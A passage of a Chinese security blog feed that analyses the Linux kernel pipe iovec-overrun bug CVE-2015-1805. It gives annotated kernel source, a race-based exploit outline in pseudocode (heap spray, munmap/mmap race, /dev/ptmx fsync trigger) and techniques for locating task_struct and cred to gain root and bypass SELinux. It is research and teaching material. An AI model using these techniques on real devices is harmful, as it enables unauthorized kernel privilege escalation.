class="keyword">long</span> nr_segs, loff_t pos)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    total_len = iov_length(iov, nr_segs);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 循环读取内存数据到iovec，iovec用户定义，把pipe里面的数据写到iov里指向的用户空间地址里</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> bufs = pipe-&gt;nrbufs;</span><br><span class="line">        <span class="keyword">if</span> (bufs) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// chars = pipe_buffer.len, inside the @page即max = 0x1000</span></span><br><span class="line">            <span class="keyword">size_t</span> chars = buf-&gt;len, remaining;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">if</span> (chars &gt; total_len)</span><br><span class="line">                chars = total_len;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 检查iovecs中的每一个iov-&gt;base是否是一个可写的用户态内存页</span></span><br><span class="line">            <span class="comment">// 如果全部可写返回0，那么atomic=1,接下来会直接使用__copy_to_user，不对目标地址再作检查</span></span><br><span class="line">            atomic = !iov_fault_in_pages_write(iov, chars);</span><br><span class="line">            remaining = chars;</span><br><span class="line">            offset = buf-&gt;offset;</span><br><span class="line">redo:</span><br><span class="line">            addr = ops-&gt;<span class="built_in">map</span>(pipe, buf, atomic);</span><br><span class="line">            <span class="comment">// 如果copy到len=X，出错返回，那么已经copy成功的iov-&gt;iov_len会被减去，但是读取缓冲区的长度total_len，并没有同步减少。</span></span><br><span class="line">            <span class="comment">// 进入redo逻辑后，还会继续copy长度为total_len的字节, 但是iov已经在前一次失败中减去已经copy的长度X。</span></span><br><span class="line">            <span class="comment">// 那么最终会向iov后越界copy len=X个长度的数据，aka"iovec overrun"</span></span><br><span class="line">            error = pipe_iov_copy_to_user(iov, addr, &amp;offset,</span><br><span class="line">                              &amp;remaining, atomic);</span><br><span class="line">            ops-&gt;unmap(pipe, buf, addr);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(error)) &#123;</span><br><span class="line">                <span class="comment">/*</span><br><span class="line">                 * Just retry with the slow path if we failed.</span><br><span class="line">                 */</span></span><br><span class="line">                <span class="keyword">if</span> (atomic) &#123;</span><br><span class="line">                    atomic = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> redo;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!ret)</span><br><span class="line">                    ret = error;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += chars;</span><br><span class="line">            buf-&gt;offset += chars;</span><br><span class="line">            buf-&gt;len -= chars;</span><br><span class="line">            ...</span><br><span class="line">            total_len -= chars;</span><br><span class="line">            <span class="keyword">if</span> (!total_len)</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">/* common path: read succeeded */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">pipe_iov_copy_to_user</span><span class="params">(<span class="keyword">struct</span> iovec *iov, <span class="keyword">void</span> *addr, <span class="keyword">int</span> *offset,</span><br><span class="line">              size_t *remaining, <span class="keyword">int</span> atomic)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> copy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*remaining &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!iov-&gt;iov_len)</span><br><span class="line">            iov++;</span><br><span class="line">        copy = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>, *remaining, iov-&gt;iov_len);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果atomic=1，直接调用__copy_to_user,否则使用copy_to_user进行地址检查(access_ok)</span></span><br><span class="line">        <span class="keyword">if</span> (atomic) &#123;</span><br><span class="line">            <span class="keyword">if</span> (__copy_to_user_inatomic(iov-&gt;iov_base,</span><br><span class="line">                            addr + *offset, copy))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (copy_to_user(iov-&gt;iov_base,</span><br><span class="line">                     addr + *offset, copy))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 每次copy完一个iov的时候对iov-&gt;len的长度进行更新</span></span><br><span class="line">        *offset += copy;</span><br><span class="line">        *remaining -= copy;</span><br><span class="line">        iov-&gt;iov_base += copy;</span><br><span class="line">        <span class="comment">// !!! 如果copy到len=X，出错返回，那么已经copy成功的iov-&gt;len会被减去</span></span><br><span class="line">        iov-&gt;iov_len -= copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="触发逻辑">触发逻辑</h2><p>第一次拷贝：<br>iov_fault_in_pages_write()检测通过即atomic = 1。<br>pipe_iov_copy_to_user()中途失败即其中某一个iov-&gt;base指向的内存页无效。</p>
<p>第二次拷贝，进入redo逻辑：<br>pipe_iov_copy_to_user()成功，即使其中失效的iov-&gt;base重新生效。<br>此时atomic在第一次失败时候置0，因此会使用copy_to_user，因此不能触发越界写，保证一个合法的buf-&gt;len拷贝完成功返回。<br>并且让total_len稍大于buf-&gt;len(max=0x1000),拷贝完成还有剩余进入下一次循环。</p>
<p>第三次拷贝：<br>iov_fault_in_pages_write()检测通过即atomic = 1。<br>pipe_iov_copy_to_user()越界拷贝。</p>
<h2 id="利用">利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> iovec iov[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">    iov[i].iov_base = <span class="number">0x4000000</span> + i * <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        iov[i].iov_len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">1</span>)</span><br><span class="line">        iov[i].iov_len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        iov[i].iov_len = <span class="number">0x8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>total_len = (0x200-2)*8+0x20 = 0x1010</p>
<p>第一次拷贝：</p>
<pre><code>iov[<span class="number">0</span>]-&gt;iov_base = <span class="number">0x40000000</span>;
iov[<span class="number">0</span>]-&gt;iov_len = <span class="number">0x0</span>;
iov[<span class="number">1</span>]-&gt;iov_base = <span class="number">0x40001000</span>;
iov[<span class="number">1</span>]-&gt;iov_len = <span class="number">0x20</span>;
iov[<span class="number">2</span>]-&gt;iov_base = <span class="number">0x40002000</span>;
iov[<span class="number">2</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">3</span>]-&gt;iov_base = <span class="number">0x40003000</span>;
iov[<span class="number">3</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">4</span>]-&gt;iov_base = <span class="number">0x40004000</span>;
iov[<span class="number">4</span>]-&gt;iov_len = <span class="number">0x8</span>;
...
</code></pre><p>iov_fault_in_pages_write()检测通过，在pipe_iov_copy_to_user()中将<br>iov[2]-&gt;iov_base = 0x40002000 这个内存地址设置成无效，<br>这时iov的值如下</p>
<pre><code>iov[<span class="number">0</span>]-&gt;iov_base = <span class="number">0x40000000</span>;
iov[<span class="number">0</span>]-&gt;iov_len = <span class="number">0x0</span>;
iov[<span class="number">1</span>]-&gt;iov_base = <span class="number">0x40001000</span>;
iov[<span class="number">1</span>]-&gt;iov_len = <span class="number">0x0</span>;      <span class="comment">// !!! 这个长度值已经被消耗</span>
iov[<span class="number">2</span>]-&gt;iov_base = <span class="number">0x40002000</span>;      <span class="comment">// unmap 设置无效</span>
iov[<span class="number">2</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">3</span>]-&gt;iov_base = <span class="number">0x40003000</span>;
iov[<span class="number">3</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">4</span>]-&gt;iov_base = <span class="number">0x40004000</span>;
iov[<span class="number">5</span>]-&gt;iov_len = <span class="number">0x8</span>;
</code></pre><p>函数返回后执行 redo。</p>
<p>第二次拷贝：</p>
<pre><code>iov[<span class="number">0</span>]-&gt;iov_base = <span class="number">0x40000000</span>;
iov[<span class="number">0</span>]-&gt;iov_len = <span class="number">0x0</span>;
iov[<span class="number">1</span>]-&gt;iov_base = <span class="number">0x40001000</span>;
iov[<span class="number">1</span>]-&gt;iov_len = <span class="number">0x0</span>;      <span class="comment">// !!! 这个长度值已经被消耗</span>
iov[<span class="number">2</span>]-&gt;iov_base = <span class="number">0x40002000</span>;      <span class="comment">// mmap 设置有效</span>
iov[<span class="number">2</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">3</span>]-&gt;iov_base = <span class="number">0x40003000</span>;
iov[<span class="number">3</span>]-&gt;iov_len = <span class="number">0x8</span>;
iov[<span class="number">4</span>]-&gt;iov_base = <span class="number">0x40004000</span>;
iov[<span class="number">5</span>]-&gt;iov_len = <span class="number">0x8</span>;
</code></pre><p>pipe_iov_copy_to_user函数正常执行完以后，iov的值如下</p>
<pre><code>iov[<span class="number">0</span>]-&gt;iov_base = <span class="number">0x40000000</span>;
iov[<span class="number">0</span>]-&gt;iov_len = <span class="number">0x0</span>;
...
iov[<span class="number">0x1ff</span>]-&gt;iov_base = <span class="number">0x401ff000</span>;
iov[<span class="number">0x1ff</span>]-&gt;iov_len = <span class="number">0x0</span>;
</code></pre><p>到这个时刻，分配的iov[0x200] 其实已经使用完毕，<br>但是因为第一次调用时故意引发的错误导致 total_len -= chars 没有更新。</p>
<pre><code><span class="constant">total_len</span> = 0x1010; 
<span class="constant">chars</span> = 0x1000，
<span class="constant">total_len</span> -= chars;
<span class="constant">total_len</span> = 0x10;
</code></pre><p>第三次拷贝：</p>
<pre><code>iov[<span class="number">0</span>]-&gt;iov_base = <span class="number">0x40000000</span>;
iov[<span class="number">0</span>]-&gt;iov_len = <span class="number">0x0</span>;
...
iov[<span class="number">0x1ff</span>]-&gt;iov_base = <span class="number">0x401ff000</span>;
iov[<span class="number">0x1ff</span>]-&gt;iov_len = <span class="number">0x0</span>;
iov[<span class="number">0x200</span>]-&gt;iov_base = ????????;
iov[<span class="number">0x200</span>]-&gt;iov_len = ????????;
</code></pre><p>再次进入pipe_iov_copy_to_user()，由于 0x1ff 项已经使用完了，<br>继续累加就会开始往0x200项的iov_base写值了，这样就产生了一个数组越界写。<br>只要控制 iov[0x200]-&gt;iov_base 和 iov[0x200]-&gt;iov_len 的内容，就达到了内核任意地址写任意值。</p>
<p>整理整个逻辑流程如下(参考<a href="http://www.retme.net/index.php/2016/03/19/some-points-on-cve-2015-1805.html" target="_blank" rel="external">race时间轴</a>和<a href="http://huntcve.github.io/2016/04/11/cve-2015-1805/" target="_blank" rel="external">图解CVE-2015-1805</a>):</p>
<p><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1805-time_line.png" alt="time_line"></p>
<p>利用伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">init_payloads</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        iov[i].iov_base = mmap(<span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            iov[i].iov_len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">1</span>)</span><br><span class="line">            iov[i].iov_len = <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            iov[i].iov_len = <span class="number">0x8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> </span><br><span class="line"><span class="title">write_msg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    msg.msg_hdr.msg_iov = iovecs_write;</span><br><span class="line">    msg.msg_hdr.msg_iovlen = <span class="number">0x200</span>;</span><br><span class="line">    msg.msg_hdr.msg_control = iovecs_write;</span><br><span class="line">    msg.msg_hdr.msg_controllen = (<span class="number">0x200</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iovec));</span><br><span class="line">    <span class="keyword">while</span> (!stop_send) &#123;</span><br><span class="line">        i_ret = syscall(__NR_sendmmsg, fd_sock, &amp;msg, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span><br><span class="line"><span class="title">heap_spray</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        iovecs_write[i].iov_base = (<span class="keyword">void</span>*)flag_addr;</span><br><span class="line">        iovecs_write[i].iov_len = <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    iovecs_write[<span class="number">0</span>].iov_len = <span class="number">0</span>;</span><br><span class="line">    iovecs_write[<span class="number">1</span>].iov_base = (<span class="keyword">void</span>*)patch_kernel_addr;</span><br><span class="line">    iovecs_write[<span class="number">1</span>].iov_len = <span class="number">0x10</span>;     <span class="comment">// patch len</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="number">255</span>) &#123;</span><br><span class="line">        pthread_create(write_msg);</span><br><span class="line">    &#125;</span><br><span class="line">    stop_send = <span class="number">1</span>;</span><br><span class="line">    pthread_join();</span><br><span class="line">    stop_send = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">read_msg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;mutex_read_msg);</span><br><span class="line">    readv();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> </span><br><span class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[],<span class="keyword">char</span> *env[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// padding iovec[0x200]</span></span><br><span class="line">    init_payloads();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// padding patch_kernel_addr</span></span><br><span class="line">    heap_spray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// write do_root addr</span></span><br><span class="line">        write_pipe(get_root_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// lock</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex_read_msg);</span><br><span class="line"></span><br><span class="line">        pthread_create(read_msg);</span><br><span class="line">        <span class="comment">// wait readv() ready</span></span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;g_mutex_read_msg);</span><br><span class="line">        munmap();</span><br><span class="line">        mmap();</span><br><span class="line">    &#125; <span class="keyword">while</span> (*(<span class="keyword">int</span>*)flag_addr != get_root_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"success\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if patch_kernel_addr == fsync_addr</span></span><br><span class="line">    fd = open(<span class="string">"/dev/ptmx"</span>);</span><br><span class="line">    fsync(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>在linux 内核3.16版本之前的fs/pipe.c当中，由于pipe_read和pipe_write没有考虑到拷贝过程中数据没有同步的一些临界情况,造成了拷贝越界的问题，因此有可能导致系统crash以及系统权限提升。这种漏洞又称之为”I/O vector array overrun”。</p>]]>
    
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="iovyroot" scheme="http://blog.idhyt.com/tags/iovyroot/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[进程描述符]]></title>
    <link href="http://blog.idhyt.com/2016/06/09/exploit-process-descriptor/"/>
    <id>http://blog.idhyt.com/2016/06/09/exploit-process-descriptor/</id>
    <published>2016-06-08T17:46:11.000Z</published>
    <updated>2016-07-07T14:47:40.000Z</updated>
    <content type="html"><![CDATA[<p>漏洞利用的核心都是通过修改task_struct中的一些字段来达到任意地址读写和提权操作的。<br><a id="more"></a></p>
<p>进程描述符task_struct数据结构包含了与一个进程相关的所有信息，在<code>kernel/include/linux/sched.h</code>中定义，其中有很多字段是通过预定义形式来定义填充在结构体中，所以在每个系统版本中其数据结构也会不同。</p>
<p>把task_struct中的数据全部打印出来，会看到很多有趣的东西，这些特征可以用来定位重要的结构。</p>
<h2 id="定位cred">定位cred</h2><p>漏洞提权过程中修改的cred.security信息，需要先定位到cred。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x4d0</span> = <span class="number">0xffffffc0461ce4d0</span>: <span class="number">0xffffffc0461ce4d0</span>    <span class="comment">// cpu_timers[0]</span></span><br><span class="line">+<span class="number">0x4d8</span> = <span class="number">0xffffffc0461ce4d8</span>: <span class="number">0xffffffc0461ce4d0</span></span><br><span class="line">+<span class="number">0x4e0</span> = <span class="number">0xffffffc0461ce4e0</span>: <span class="number">0xffffffc0461ce4e0</span>    <span class="comment">// cpu_timers[1]</span></span><br><span class="line">+<span class="number">0x4e8</span> = <span class="number">0xffffffc0461ce4e8</span>: <span class="number">0xffffffc0461ce4e0</span></span><br><span class="line">+<span class="number">0x4f0</span> = <span class="number">0xffffffc0461ce4f0</span>: <span class="number">0xffffffc0461ce4f0</span>    <span class="comment">// cpu_timers[2]</span></span><br><span class="line">+<span class="number">0x4f8</span> = <span class="number">0xffffffc0461ce4f8</span>: <span class="number">0xffffffc0461ce4f0</span></span><br><span class="line">+<span class="number">0x500</span> = <span class="number">0xffffffc0461ce500</span>: <span class="number">0xffffffc0101f4900</span>    <span class="comment">// real_cred </span></span><br><span class="line">+<span class="number">0x508</span> = <span class="number">0xffffffc0461ce508</span>: <span class="number">0xffffffc0101f4900</span>    <span class="comment">// cred </span></span><br><span class="line">+<span class="number">0x510</span> = <span class="number">0xffffffc0461ce510</span>: <span class="number">0x363130322d657663</span>    <span class="comment">// char comm[TASK_COMM_LEN]</span></span><br><span class="line">+<span class="number">0x518</span> = <span class="number">0xffffffc0461ce518</span>: <span class="number">0x652d333534322d</span></span><br></pre></td></tr></table></figure>
<p>通过cpu_timers的特征就有了通用的定位方法，也是所有提权代码中都用到的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (task-&gt;cpu_timers[<span class="number">0</span>].next == task-&gt;cpu_timers[<span class="number">0</span>].prev &amp;&amp;</span><br><span class="line">    task-&gt;cpu_timers[<span class="number">1</span>].next == task-&gt;cpu_timers[<span class="number">1</span>].prev &amp;&amp;</span><br><span class="line">    task-&gt;cpu_timers[<span class="number">2</span>].next == task-&gt;cpu_timers[<span class="number">2</span>].prev &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">0</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">1</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">2</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    task-&gt;real_cred == task-&gt;cred &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cred &gt; KERNEL_START) &#123;</span><br><span class="line">    <span class="comment">// do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>comm[TASK_COMM_LEN]</code>字段是进程名，也可以通过这个特征来找到cred，找到进程名的地址，然后减8(x64)就是cred的地址了。</p>
<h2 id="遍历进程tasks">遍历进程tasks</h2><p>task_struct结构中定义了一个list_head类型的tasks。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">task_struct &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">struct</span> list_head tasks;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    <span class="keyword">struct</span> plist_node pushable_tasks;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> list_head</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> list_head *next;</span><br><span class="line">    <span class="keyword">struct</span> list_head *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>list_head为一个双向链表，可以遍历到所有进程的tasks结构。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-process-descriptor-01.png" alt=""></p>
<p>如何定位到tasks地址?</p>
<p>tasks下边有个预定义变量pushable_tasks，在多核手机总是存在的，第一个值为优先级prio，打印出来，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x290</span> = <span class="number">0xffffffc0461ce290</span>: <span class="number">0xffffffc000ee05e0</span>    <span class="comment">// struct list_head tasks</span></span><br><span class="line">+<span class="number">0x298</span> = <span class="number">0xffffffc0461ce298</span>: <span class="number">0xffffffc0a98b2290</span></span><br><span class="line">+<span class="number">0x2a0</span> = <span class="number">0xffffffc0461ce2a0</span>: <span class="number">0x8c</span>    <span class="comment">// pushable_tasks.prio</span></span><br><span class="line">+<span class="number">0x2a8</span> = <span class="number">0xffffffc0461ce2a8</span>: <span class="number">0xffffffc0461ce2a8</span></span><br><span class="line">+<span class="number">0x2b0</span> = <span class="number">0xffffffc0461ce2b0</span>: <span class="number">0xffffffc0461ce2a8</span></span><br></pre></td></tr></table></figure>
<p>在我目前所看到的值都为0x8c，因此可以通过该值来定位tasks地址。</p>
<h2 id="bypass_selinux">bypass selinux</h2><p>在不考虑selinux保护的时候，提权只需要简单的将security.osid和security.sid置1，这样得到的只是kernel权限，并不是真正的init最高权限。<br>内核中u:r:kernel:s0始终为1，而u:r:init:s0是变化的，每个内核不同。<br>因此要获取该值就要先找到init进程的task_struct。</p>
<p>如何定位init进程?</p>
<h3 id="内核符号表导出">内核符号表导出</h3><p>在<code>/arch/arm/kernel/init_task.c</code>中定义有</p>
<pre><code>struct task_struct init_task = INIT_TASK<span class="list">(<span class="keyword">init_task</span>)</span><span class="comment">;</span>
</code></pre><p>有些内核会在内核符号表kallsyms中导出init_task地址。</p>
<h3 id="遍历内核tasks">遍历内核tasks</h3><p>在漏洞利用提权过程中，获取的当前进程的task_struct，就能拿到tasks地址，然后遍历所有进程的tasks，通过comm判断是否为init进程。</p>
<h3 id="暴力搜索">暴力搜索</h3><p>在task_struct结构中有个几个字段定义了进程的一些特性，其中kernel thread的一些特征值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct &#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">long</span> state; <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">stack</span>; <span class="comment">// 2-page (8K) aligned address,栈指针，指向当前thread_info结构。</span></span><br><span class="line">    <span class="keyword">atomic_t</span> usage; <span class="comment">// 0x2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags; <span class="comment">// 0x200000, I am a kernel thread</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>搜索范围可以通过<code>/proc/iomem</code>中的kernel data字段获取，通过这些特征值就可以找到内核进程swapper/0的task_struct结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (pos = begin; pos &lt; end; pos += <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( task_struct_buf.<span class="built_in">stack</span> &amp; <span class="number">0x1ff</span> == <span class="number">0</span> &amp;&amp; </span><br><span class="line">         task_struct_buf.usage == <span class="number">0x2</span> &amp;&amp; </span><br><span class="line">         task_struct_buf.flags == <span class="number">0x200000</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfound swapper/0 task_struct_address: %lp\n"</span>, pos);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后找到tasks依次遍历内核进程定位init进程。</p>
<h2 id="父进程">父进程</h2><p>task_struct中通过<code>struct task_struct __rcu *real_parent</code>定义了该进程的父进程，通过如下方法可以将父进程改为init进程。</p>
